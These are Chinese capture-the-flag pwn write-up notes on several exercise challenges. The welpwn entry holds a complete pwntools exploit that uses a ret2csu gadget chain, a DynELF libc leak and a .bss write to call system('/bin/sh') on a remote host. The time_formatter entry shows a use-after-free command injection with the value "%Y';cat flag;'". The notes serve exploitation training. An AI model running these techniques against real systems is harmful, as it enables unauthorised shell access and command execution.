## pwn高手进阶区
### 1. 反应釜开关控制
题目：小M在里一个私人矿厂中发现了一条TNT生产线中硝化反应釜的接口，反应釜是一种反应设备，非常的不稳定，会因为很多原因造成损坏，导致生产被迫停止。她怀疑这个工厂可能进行地下军火的制作，所以小M打算通过把反应釜关闭掉来干扰这条TNT生产线的运行，但是反应釜有多个闸门，得想办法帮她把闸门都关掉才行。

思路：简单栈溢出。

### 2. dice_game
题目：暂无。

思路：简单栈溢出，通过覆盖种子变量控制随机变量序列，然后爆破该序列即可。

### 3. forgot
题目：福克斯最近玩弄有限状态自动机。在探索概念实现正则表达式使用FSA他想实现一个电子邮件地址验证。 最近，Lua开始骚扰福克斯。对此，福克斯向Lua挑战斗智斗勇。福克斯承诺要奖励Lua，如果她能到不可达状态在FSA他实施过渡。可以在这里访问复制。 运行服务hack.bckdr.in:8009

思路：简单栈溢出，通过覆盖函数指针执行获取flag的函数即可。

### 4. Mary_Morton
题目：非常简单的热身pwn

思路：综合了格式化字符串漏洞和栈溢出，通过格式化字符串漏洞泄露canany内容，然后使用栈溢出跳转到获取flag的函数即可。

### 4. warmup
题目：暂无

思路：只提供了一个nc地址，并且提示了一个函数地址，猜测是简单的栈溢出，但是由于不知道缓存区的大小，因此只能通过爆破的方式猜测缓存区大小。

### 5. welpwn
题目：暂无

思路：这道题目没有提供libc，需要通过远程泄露的方式查找system函数地址

#### 通过DynELF对象查找system函数地址的方法
需要提供一个泄露任意地址信息的函数，DynELF可以自动高效的查找system函数的地址
```python
elf = ELF('welpwn')
d = DynELF(leak, elf=elf)
system = d.lookup('system', 'libc')
```

#### 万能gadget
调用libc的程序中一般都一段这样的代码（具体地址会根据不同的程序有区别），这段代码被称为万能gadget
```python
.text:0000000000400880 loc_400880:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400880                 mov     rdx, r13
.text:0000000000400883                 mov     rsi, r14
.text:0000000000400886                 mov     edi, r15d
.text:0000000000400889                 call    qword ptr [r12+rbx*8]
.text:000000000040088D                 add     rbx, 1
.text:0000000000400891                 cmp     rbx, rbp
.text:0000000000400894                 jnz     short loc_400880
.text:0000000000400896
.text:0000000000400896 loc_400896:                             ; CODE XREF: __libc_csu_init+36↑j
.text:0000000000400896                 add     rsp, 8
.text:000000000040089A                 pop     rbx
.text:000000000040089B                 pop     rbp
.text:000000000040089C                 pop     r12
.text:000000000040089E                 pop     r13
.text:00000000004008A0                 pop     r14
.text:00000000004008A2                 pop     r15
.text:00000000004008A4                 retn
```
这里实际上有两个片段:第一个片段是0x40089A，简称ppppppr，作用是设置6个寄存器的内容，然后返回；第二个片段是0x400880，简称mmmcall，作用是设置三个参数，然后调用寄存器所指向的函数。64位传参寄存器顺序如下：rdi, rsi, rdx, rcx, r8, r9。

通过这段万能gadget基本可以实现任意函数指针调用：
```python
# 栈溢出缓冲区大小
payload = 'A' * padding
rbx = 0
rbp = 1
# 需要调用的函数指针，如elf.got['write']
r12 = funcAddr
r13 = arg2
r14 = arg1
r15 = arg0
# 这段payload的意思是栈溢出后首先跳转到ppppppr片段处
# 然后依次将栈顶内容弹出到6个寄存器
# 最后跳转到mmmcall片段
# 分析mmmcall片段，可以知道r15最终进入edi，r14进入rsi，r13进入rdx，分别为函数调用的前三个参数
# 最终调用的函数地址为r12+rbx*8，即为funcAddr，这也是前面rbx置为0的原因
payload += ppppppr + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + mmmcall
# 这段payload的意思是mmmcall返回后重入到main或者跳转到其他函数
# 分析mmmcall返回后的代码执行情况
# 首先执行add rbx,1，此时rbx为1
# 继续执行cmp rbx,rbp，由于之前设置了rbp为1，因此这里是相等的
# 下面的跳转失败，因此继续执行add rsp,8，相当于丢弃栈顶8个字节
# 然后回到了第一个gadget，继续弹出48个字节，最后返回
# 因此首先在栈顶布置了56字节的填充数据，在放置了需要返回的地址
payload += b'A' * 56 + main
```

#### 利用bss段写入内容
由于bss段是可写的，可以直接利用read函数向bss段写入/bin/sh字符串以及system函数地址，一方面上面的万能gadget只能调用函数指针，不方便直接调用函数，另一方面也省去了查找/bin/sh字符串的功夫。

这里有个两个技巧，一是bss段本身存储了全局变量，直接写elf.bss()起始地址可能会由于程序重入后修改全局变量导致写入失败，因此最好写入改为elf.bss()+500，由于内存都是按照4k大小申请的，因此增加一段偏移不会导致程序非法访问内存，同时正常程序运行也不会写入到这里，提高了写入成功率；二是写入完成后可以继续利用write等读取写入的内容，查看是否相同

全部利用代码如下：
```python
from pwn import *

sh = remote('220.249.52.133', 41706)
context(arch='amd64', os='linux')

elf = ELF('welpwn')

BUFLEN = 16

# 万能gadget
ppppr = 0x40089C
ppppppr = 0x40089a
mmmcall = 0x400880
'''
.text:0000000000400880 loc_400880:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400880                 mov     rdx, r13
.text:0000000000400883                 mov     rsi, r14
.text:0000000000400886                 mov     edi, r15d
.text:0000000000400889                 call    qword ptr [r12+rbx*8]
.text:000000000040088D                 add     rbx, 1
.text:0000000000400891                 cmp     rbx, rbp
.text:0000000000400894                 jnz     short loc_400880
.text:0000000000400896
.text:0000000000400896 loc_400896:                             ; CODE XREF: __libc_csu_init+36↑j
.text:0000000000400896                 add     rsp, 8
.text:000000000040089A                 pop     rbx
.text:000000000040089B                 pop     rbp
.text:000000000040089C                 pop     r12
.text:000000000040089E                 pop     r13
.text:00000000004008A0                 pop     r14
.text:00000000004008A2                 pop     r15
.text:00000000004008A4                 retn
'''

# 是否存在printf输出缓存
hasPrinfBuf = False
# 缓存长度
printfLen = None

# 利用万能gadget封装一个函数指针调用功能
def makePayload(funcAddr, arg0, arg1, arg2):
    global printfLen
    # 这一段在echo函数中会被复制到缓冲区中导致栈溢出
    # 后续因为有0字符不会被复制
    payload = b'A' * BUFLEN
    payload += b'B' * 8
    ## echo中栈溢出后esp指向main中的buf，需要先弹出用于copy到echo中的buf的内容（32字节）
    ## 因此第一个gadget为ppppr，即弹出32字节，然后返回
    ret = ppppr
    payload += p64(ret)
    # 上面这一段会被截断并打印出来
    printfLen = len(payload.strip(b'\x00'))
    # 复制结束

    # main buff前面还有32字节的内容（用于copy到echo中的buf的内容）
    # payload = b'A' * BUFLEN
    # payload += b'B' * 8
    # ret = ppppr
    # pyaload += p64(ret)
    # 这里ret是上一个ppppr的返回地址
    ret = ppppppr
    payload += p64(ret)
    rbx = 0
    rbp = 1
    #r12 = elf.got['write']
    r12 = funcAddr
    # r13 = 8
    r13 = arg2
    # r14 = addr
    r14 = arg1
    #r15 = 1
    r15 = arg0
    # 这里ret是上一个ppppppr的返回地址
    ret = mmmcall
    payload += p64(rbx)
    payload += p64(rbp)
    payload += p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    payload += p64(ret)
    # mmmcall指令执行完后，还会继续执行到add rsp,8和ppppppr指令
    # 因此首先安排56字节填充内容，然后在放置新的返回地址，这里使用main函数
    ret = elf.sym['main']
    payload += b'C' * 56
    payload += p64(ret) 
    return payload

def leak(addr):
    global hasPrinfBuf
    global printfLen
    payload = makePayload(elf.got['write'], 1, addr, 8)
    data = sh.recvuntil('RCTF\n')
    # print(data)
    sh.sendline(payload)
    # 第一次进入main函数的时候，会执行printf函数，然后执行write泄露地址
    # 但是write会优先输出，printf会等待下次重入main的时候才输出
    # 因此除了第一次没有printf缓存输出，后续每次都会先输出printf的缓存内容
    if hasPrinfBuf:
        sh.recv(printfLen)
    hasPrinfBuf = True
    data = sh.recv(8)
    # print(data)
    return data

d = DynELF(leak, elf=elf)
system = d.lookup('system', 'libc')
log.success("system addr = " + hex(system))

# print('bss')
# print(elf.bss())
bss = elf.bss() + 500
binStr = b'/bin/sh\x00' + p64(system)
payload = makePayload(elf.got['read'], 0, bss, len(binStr) + 1)
data = sh.recvuntil('RCTF\n')
sh.sendline(payload)
sleep(1)
sh.sendline(binStr)

payload = makePayload(elf.got['write'], 1, bss, len(binStr))
data = sh.recvuntil('RCTF\n')
sh.sendline(payload)
sleep(1)
print(printfLen)
data = sh.recv(printfLen)
print(data)
data = sh.recv(len(binStr))
if data == binStr:
    log.success('write /bin/sh ok!')
else:
    log.error('write /bin/sh error')

# 这里不方便直接调用system函数
# 因此先将system地址写入bss+8，然后调用这个函数指针
payload = makePayload(bss + 8, bss, 0, 0)
data = sh.recvuntil('RCTF\n')
sh.sendline(payload)
sleep(1)
print(printfLen)
data = sh.recv(printfLen)
print(data)
sh.interactive()
```


### 6. monkey
题目：暂无

思路：运行后得到一个类似nodejs的解释器，使用os.system('cat flag')得到flag。


### 7. time_formatter
题目：将UNIX时间转换为日期是很困难的，所以玛丽编写了一个工具来完成这个任务。

思路：退出时free内存的时候存在悬挂指针。

程序在输出时间时使用了system，参数是使用时间格式字符串格式拼接而成，但是字符串格式输入时进行了过滤，不能直接使用命令注入。但是在退出时，时间格式字符串被free后成了悬挂指针，这时候利用设置时区重新分配一段内存，由于堆内存分配特点，这次分配的内存和上次释放的时间格式字符串内存指向同一个地址，因此此时时间格式字符串指向了时区字符串，而时区字符串是没有进行过滤的，再次拼接时就发生了命令注入。
```python
Welcome to Mary's Unix Time Formatter!
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 1
Format: %Y
Format set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 5
Are you sure you want to exit (y/N)? N
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 3
Time zone: %Y';cat flag;'
Time zone set.
1) Set a time format.
2) Set a time.
3) Set a time zone.
4) Print your time.
5) Exit.
> 4
Your formatted time is: sh: 1: /bin/date: not found
cyberpeace{2c3475a0a0745a90418c2694c7dc54e4}
sh: 1: : Permission denied
1) Set a time format.
```